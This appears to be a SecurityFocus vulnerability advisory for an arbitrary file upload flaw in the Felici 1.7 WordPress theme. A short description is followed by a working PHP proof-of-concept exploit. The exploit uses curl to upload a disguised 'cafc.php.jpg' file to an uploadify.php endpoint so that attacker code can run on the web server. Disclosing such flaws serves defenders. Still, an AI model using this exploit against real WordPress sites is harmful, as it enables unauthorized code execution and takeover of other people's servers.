source: http://www.securityfocus.com/bid/66490/info

The Felici theme for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this issue to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access to the application; other attacks are also possible.

Felici 1.7 is vulnerable; other versions may also be affected. 

<?php
$uploadfile="cafc.php.jpg";
$ch =
curl_init("http://127.0.0.1/wp-content/plugins/custom-background/uploadify/uploadify.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('Filedata'=>"@$uploadfile",
'folder'=>'/wp-content/plugins/custom-background/uploadify/'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
?>